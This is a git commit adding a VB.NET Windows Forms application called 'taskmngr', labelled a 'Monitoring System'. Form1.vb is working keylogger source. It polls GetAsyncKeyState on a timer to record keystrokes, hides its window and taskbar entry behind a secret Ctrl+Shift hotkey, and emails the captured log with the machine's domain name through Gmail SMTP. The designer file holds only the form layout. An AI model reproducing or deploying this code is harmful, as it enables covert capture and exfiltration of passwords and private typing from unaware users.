73a350f939918163ba5a43f7fa68b869af16880a
Karan Bhardwaj <bhardwajkaran054@gmail.com>
2020-04-30 23:13:51 +0530

    Add files via upload

---
+++ taskmngr/Form1.Designer.vb
@@ -0,0 +1,177 @@
+﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
+Partial Class Form1
+    Inherits System.Windows.Forms.Form
+
+    'Form overrides dispose to clean up the component list.
+    <System.Diagnostics.DebuggerNonUserCode()> _
+    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
+        Try
+            If disposing AndAlso components IsNot Nothing Then
+                components.Dispose()
+            End If
+        Finally
+            MyBase.Dispose(disposing)
+        End Try
+    End Sub
+
+    'Required by the Windows Form Designer
+    Private components As System.ComponentModel.IContainer
+
+    'NOTE: The following procedure is required by the Windows Form Designer
+    'It can be modified using the Windows Form Designer.  
+    'Do not modify it using the code editor.
+    <System.Diagnostics.DebuggerStepThrough()> _
+    Private Sub InitializeComponent()
+        Me.components = New System.ComponentModel.Container()
+        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Form1))
+        Me.RichTextBox1 = New System.Windows.Forms.RichTextBox()
+        Me.Button1 = New System.Windows.Forms.Button()
+        Me.Button2 = New System.Windows.Forms.Button()
+        Me.Button4 = New System.Windows.Forms.Button()
+        Me.Timer1 = New System.Windows.Forms.Timer(Me.components)
+        Me.Timer2 = New System.Windows.Forms.Timer(Me.components)
+        Me.Button3 = New System.Windows.Forms.Button()
+        Me.PictureBox1 = New System.Windows.Forms.PictureBox()
+        Me.Label1 = New System.Windows.Forms.Label()
+        Me.Label2 = New System.Windows.Forms.Label()
+        Me.Label3 = New System.Windows.Forms.Label()
+        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).BeginInit()
+        Me.SuspendLayout()
+        '
+        'RichTextBox1
+        '
+        Me.RichTextBox1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
+        Me.RichTextBox1.Location = New System.Drawing.Point(153, 162)
+        Me.RichTextBox1.Margin = New System.Windows.Forms.Padding(4)
+        Me.RichTextBox1.Name = "RichTextBox1"
+        Me.RichTextBox1.Size = New System.Drawing.Size(469, 175)
+        Me.RichTextBox1.TabIndex = 0
+        Me.RichTextBox1.Text = ""
+        '
+        'Button1
+        '
+        Me.Button1.Location = New System.Drawing.Point(45, 167)
+        Me.Button1.Margin = New System.Windows.Forms.Padding(4)
+        Me.Button1.Name = "Button1"
+        Me.Button1.Size = New System.Drawing.Size(100, 28)
+        Me.Button1.TabIndex = 1
+        Me.Button1.Text = "Start"
+        Me.Button1.UseVisualStyleBackColor = True
+        '
+        'Button2
+        '
+        Me.Button2.Location = New System.Drawing.Point(45, 203)
+        Me.Button2.Margin = New System.Windows.Forms.Padding(4)
+        Me.Button2.Name = "Button2"
+        Me.Button2.Size = New System.Drawing.Size(100, 28)
+        Me.Button2.TabIndex = 1
+        Me.Button2.Text = "Stop"
+        Me.Button2.UseVisualStyleBackColor = True
+        '
+        'Button4
+        '
+        Me.Button4.Location = New System.Drawing.Point(45, 310)
+        Me.Button4.Margin = New System.Windows.Forms.Padding(4)
+        Me.Button4.Name = "Button4"
+        Me.Button4.Size = New System.Drawing.Size(100, 28)
+        Me.Button4.TabIndex = 1
+        Me.Button4.Text = "Send Log"
+        Me.Button4.UseVisualStyleBackColor = True
+        '
+        'Timer1
+        '
+        Me.Timer1.Interval = 200
+        '
+        'Timer2
+        '
+        '
+        'Button3
+        '
+        Me.Button3.Location = New System.Drawing.Point(45, 239)
+        Me.Button3.Margin = New System.Windows.Forms.Padding(4)
+        Me.Button3.Name = "Button3"
+        Me.Button3.Size = New System.Drawing.Size(100, 28)
+        Me.Button3.TabIndex = 2
+        Me.Button3.Text = "Hide"
+        Me.Button3.UseVisualStyleBackColor = True
+        '
+        'PictureBox1
+        '
+        Me.PictureBox1.Image = CType(resources.GetObject("PictureBox1.Image"), System.Drawing.Image)
+        Me.PictureBox1.Location = New System.Drawing.Point(-44, 15)
+        Me.PictureBox1.Margin = New System.Windows.Forms.Padding(4)
+        Me.PictureBox1.Name = "PictureBox1"
+        Me.PictureBox1.Size = New System.Drawing.Size(244, 124)
+        Me.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom
+        Me.PictureBox1.TabIndex = 3
+        Me.PictureBox1.TabStop = False
+        '
+        'Label1
+        '
+        Me.Label1.AutoSize = True
+        Me.Label1.Font = New System.Drawing.Font("Microsoft Sans Serif", 26.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
+        Me.Label1.Location = New System.Drawing.Point(144, 30)
+        Me.Label1.Margin = New System.Windows.Forms.Padding(4, 0, 4, 0)
+        Me.Label1.Name = "Label1"
+        Me.Label1.Size = New System.Drawing.Size(272, 52)
+        Me.Label1.TabIndex = 4
+        Me.Label1.Text = "TASKMNGR"
+        '
+        'Label2
+        '
+        Me.Label2.AutoSize = True
+        Me.Label2.Location = New System.Drawing.Point(161, 90)
+        Me.Label2.Margin = New System.Windows.Forms.Padding(4, 0, 4, 0)
+        Me.Label2.Name = "Label2"
+        Me.Label2.Size = New System.Drawing.Size(291, 17)
+        Me.Label2.TabIndex = 5
+        Me.Label2.Text = "design and develope by KARAN BHARDWAJ"
+        '
+        'Label3
+        '
+        Me.Label3.AutoSize = True
+        Me.Label3.Font = New System.Drawing.Font("Arial", 9.75!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
+        Me.Label3.Location = New System.Drawing.Point(421, 53)
+        Me.Label3.Margin = New System.Windows.Forms.Padding(4, 0, 4, 0)
+        Me.Label3.Name = "Label3"
+        Me.Label3.Size = New System.Drawing.Size(156, 19)
+        Me.Label3.TabIndex = 6
+        Me.Label3.Text = "Monitoring System"
+        '
+        'Form1
+        '
+        Me.AutoScaleDimensions = New System.Drawing.SizeF(8.0!, 16.0!)
+        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
+        Me.BackColor = System.Drawing.SystemColors.HighlightText
+        Me.ClientSize = New System.Drawing.Size(662, 384)
+        Me.Controls.Add(Me.Label3)
+        Me.Controls.Add(Me.Label2)
+        Me.Controls.Add(Me.Label1)
+        Me.Controls.Add(Me.PictureBox1)
+        Me.Controls.Add(Me.Button3)
+        Me.Controls.Add(Me.Button4)
+        Me.Controls.Add(Me.Button2)
+        Me.Controls.Add(Me.Button1)
+        Me.Controls.Add(Me.RichTextBox1)
+        Me.Margin = New System.Windows.Forms.Padding(4)
+        Me.Name = "Form1"
+        Me.ShowIcon = False
+        Me.Text = "taskmngr (By Karan Bhardwaj)"
+        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).EndInit()
+        Me.ResumeLayout(False)
+        Me.PerformLayout()
+
+    End Sub
+    Friend WithEvents RichTextBox1 As System.Windows.Forms.RichTextBox
+    Friend WithEvents Button1 As System.Windows.Forms.Button
+    Friend WithEvents Button2 As System.Windows.Forms.Button
+    Friend WithEvents Button4 As System.Windows.Forms.Button
+    Friend WithEvents Timer1 As System.Windows.Forms.Timer
+    Friend WithEvents Timer2 As System.Windows.Forms.Timer
+    Friend WithEvents Button3 As System.Windows.Forms.Button
+    Friend WithEvents PictureBox1 As System.Windows.Forms.PictureBox
+    Friend WithEvents Label1 As System.Windows.Forms.Label
+    Friend WithEvents Label2 As System.Windows.Forms.Label
+    Friend WithEvents Label3 As System.Windows.Forms.Label
+
+End Class
---
+++ taskmngr/Form1.vb
@@ -0,0 +1,262 @@
+﻿''' <summary>
+''' This Software created by Karan Bhardwaj, require any help contact bhardwajkaran054@gmail.com or visit https://karanbhardwaj.me/
+''' Get more project vist my GitHub repository https://github.com/bhardwajkaran054/
+''' </summary>
+''' <remarks></remarks>
+Imports System.Net.Mail
+
+Public Class Form1
+    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Integer) As Short
+    Public log As String
+    Dim localDate = DateTime.Now
+
+    Public Sub StartTool()
+        Button3.Enabled = True
+        Timer1.Start()
+
+        Button1.Text = "Started !"
+        Button2.Text = "Stop Recording"
+    End Sub
+
+    Public Sub StopTool()
+        Button3.Enabled = False
+        Timer1.Stop()
+        Timer2.Stop()
+        Button1.Text = "Start Recording"
+        Button2.Text = "Stopped !"
+    End Sub
+
+    Public Sub KeyLogger()
+
+
+        If (GetAsyncKeyState(65)) Then
+            log = log + "a"
+        ElseIf (GetAsyncKeyState(66)) Then
+            log = log + "b"
+        ElseIf (GetAsyncKeyState(67)) Then
+            log = log + "c"
+        ElseIf (GetAsyncKeyState(68)) Then
+            log = log + "d"
+        ElseIf (GetAsyncKeyState(69)) Then
+            log = log + "e"
+        ElseIf (GetAsyncKeyState(70)) Then
+            log = log + "f"
+        ElseIf (GetAsyncKeyState(71)) Then
+            log = log + "g"
+        ElseIf (GetAsyncKeyState(72)) Then
+            log = log + "h"
+        ElseIf (GetAsyncKeyState(73)) Then
+            log = log + "i"
+        ElseIf (GetAsyncKeyState(74)) Then
+            log = log + "j"
+        ElseIf (GetAsyncKeyState(75)) Then
+            log = log + "k"
+        ElseIf (GetAsyncKeyState(76)) Then
+            log = log + "l"
+        ElseIf (GetAsyncKeyState(77)) Then
+            log = log + "m"
+        ElseIf (GetAsyncKeyState(78)) Then
+            log = log + "n"
+        ElseIf (GetAsyncKeyState(79)) Then
+            log = log + "o"
+        ElseIf (GetAsyncKeyState(80)) Then
+            log = log + "p"
+        ElseIf (GetAsyncKeyState(81)) Then
+            log = log + "q"
+        ElseIf (GetAsyncKeyState(82)) Then
+            log = log + "r"
+        ElseIf (GetAsyncKeyState(83)) Then
+            log = log + "s"
+        ElseIf (GetAsyncKeyState(84)) Then
+            log = log + "t"
+        ElseIf (GetAsyncKeyState(85)) Then
+            log = log + "u"
+        ElseIf (GetAsyncKeyState(86)) Then
+            log = log + "v"
+        ElseIf (GetAsyncKeyState(87)) Then
+            log = log + "w"
+        ElseIf (GetAsyncKeyState(88)) Then
+            log = log + "x"
+        ElseIf (GetAsyncKeyState(89)) Then
+            log = log + "y"
+        ElseIf (GetAsyncKeyState(90)) Then
+            log = log + "z"
+        ElseIf (GetAsyncKeyState(48)) Then
+            log = log + "0"
+        ElseIf (GetAsyncKeyState(49)) Then
+            log = log + "1"
+        ElseIf (GetAsyncKeyState(50)) Then
+            log = log + "2"
+        ElseIf (GetAsyncKeyState(51)) Then
+            log = log + "3"
+        ElseIf (GetAsyncKeyState(52)) Then
+            log = log + "4"
+        ElseIf (GetAsyncKeyState(53)) Then
+            log = log + "5"
+        ElseIf (GetAsyncKeyState(54)) Then
+            log = log + "6"
+        ElseIf (GetAsyncKeyState(55)) Then
+            log = log + "7"
+        ElseIf (GetAsyncKeyState(56)) Then
+            log = log + "8"
+        ElseIf (GetAsyncKeyState(57)) Then
+            log = log + "9"
+        ElseIf (GetAsyncKeyState(96)) Then
+            log = log + "{Num0}"
+        ElseIf (GetAsyncKeyState(97)) Then
+            log = log + "{Num1}"
+        ElseIf (GetAsyncKeyState(98)) Then
+            log = log + "{Num2}"
+        ElseIf (GetAsyncKeyState(99)) Then
+            log = log + "{Num3}"
+        ElseIf (GetAsyncKeyState(100)) Then
+            log = log + "{Num4}"
+        ElseIf (GetAsyncKeyState(101)) Then
+            log = log + "{Num5}"
+        ElseIf (GetAsyncKeyState(102)) Then
+            log = log + "{Num6}"
+        ElseIf (GetAsyncKeyState(103)) Then
+            log = log + "{Num7}"
+        ElseIf (GetAsyncKeyState(104)) Then
+            log = log + "{Num8}"
+        ElseIf (GetAsyncKeyState(105)) Then
+            log = log + "{Num9}"
+        ElseIf (GetAsyncKeyState(106)) Then
+            log = log + "{Num*}"
+        ElseIf (GetAsyncKeyState(107)) Then
+            log = log + "{Num+}"
+        ElseIf (GetAsyncKeyState(13)) Then
+            log = log + "{Enter}"
+        ElseIf (GetAsyncKeyState(109)) Then
+            log = log + "{Num-}"
+        ElseIf (GetAsyncKeyState(110)) Then
+            log = log + "{Num.}"
+        ElseIf (GetAsyncKeyState(111)) Then
+            log = log + "{Num/}"
+        ElseIf (GetAsyncKeyState(32)) Then
+            log = log + "{Space}"
+        ElseIf (GetAsyncKeyState(8)) Then
+            log = log + "{Backspace}"
+        ElseIf (GetAsyncKeyState(9)) Then
+            log = log + "{Tab}"
+        ElseIf (GetAsyncKeyState(16)) Then
+            log = log + "{Shift}"
+        ElseIf (GetAsyncKeyState(17)) Then
+            log = log + "{Control}"
+        ElseIf (GetAsyncKeyState(20)) Then
+            log = log + "{Caps}"
+        ElseIf (GetAsyncKeyState(27)) Then
+            log = log + "{Esc}"
+        ElseIf (GetAsyncKeyState(33)) Then
+            log = log + "{PGup}"
+        ElseIf (GetAsyncKeyState(34)) Then
+            log = log + "{PGdn}"
+        ElseIf (GetAsyncKeyState(35)) Then
+            log = log + "{End}"
+        ElseIf (GetAsyncKeyState(36)) Then
+            log = log + "{Home}"
+        ElseIf (GetAsyncKeyState(37)) Then
+            log = log + "{LArrow}"
+        ElseIf (GetAsyncKeyState(38)) Then
+            log = log + "{UArrow}"
+        ElseIf (GetAsyncKeyState(39)) Then
+            log = log + "{RArrow}"
+        ElseIf (GetAsyncKeyState(40)) Then
+            log = log + "{DArrow}"
+        ElseIf (GetAsyncKeyState(45)) Then
+            log = log + "{Insert}"
+        ElseIf (GetAsyncKeyState(46)) Then
+            log = log + "{Del}"
+        ElseIf (GetAsyncKeyState(144)) Then
+            log = log + "{NumLock}"
+        ElseIf (GetAsyncKeyState(188)) Then
+            log = log + "{,}"
+        End If
+        RichTextBox1.Text = log
+        Dim hotkey1 As Boolean
+        hotkey1 = GetAsyncKeyState(Keys.K)
+        If My.Computer.Keyboard.CtrlKeyDown AndAlso My.Computer.Keyboard.ShiftKeyDown Then
+            Me.Visible = True
+            Me.ShowInTaskbar = True
+        End If
+    End Sub
+
+    Public Sub mail_info()
+        Try
+            Dim smtp_server As New SmtpClient
+            Dim e_mail As New MailMessage
+            smtp_server.UseDefaultCredentials = False
+            smtp_server.Credentials = New Net.NetworkCredential("<your@email.com>", "<@YourPassword#>")
+            smtp_server.Port = 587
+            smtp_server.EnableSsl = True
+            smtp_server.Host = "smtp.gmail.com"
+            e_mail = New MailMessage
+            e_mail.From = New MailAddress("<your@email.com>")
+            e_mail.To.Add("<your@email.com>")
+            e_mail.Subject = "Info"
+            e_mail.Body = localDate + " " + Environment.UserDomainName + " " + RichTextBox1.Text
+            smtp_server.Send(e_mail)
+            log = ""
+            MsgBox("Mail successfully send")
+        Catch ex As Exception
+            MsgBox(ex.Message)
+            MsgBox("Pls set your email addres and password on code line no. 185, 190, 191 and make sure your email accessable by third party(check your email privacy) ")
+        End Try
+
+    End Sub
+
+    Public Sub Hide()
+        MsgBox("Press Ctrl+Shift to make keylogger visible !", MsgBoxStyle.Information)
+        Me.Visible = "false"
+        Me.ShowInTaskbar = "false"
+    End Sub
+
+    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
+        StartTool()
+    End Sub
+
+    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
+        StopTool()
+    End Sub
+
+
+    Private Sub Button4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button4.Click
+        mail_info()
+
+    End Sub
+
+    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
+        KeyLogger()
+    End Sub
+
+  
+    Private Sub Timer2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick
+        '  mail_info()
+
+    End Sub
+
+   
+
+    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
+        Button3.Enabled = False
+        'Timer1.Start()
+        'Timer2.Start()
+        'Button1.Text = "Started !"
+        'Button2.Text = "Stop Recording"
+       
+    End Sub
+
+    Private Sub Button3_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
+
+        Hide()
+    End Sub
+
+
+    Private Sub Form1_Shown(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Shown
+
+        Me.Visible = "true"
+        Me.ShowInTaskbar = "true"
+    End Sub
+
+    
+End Class
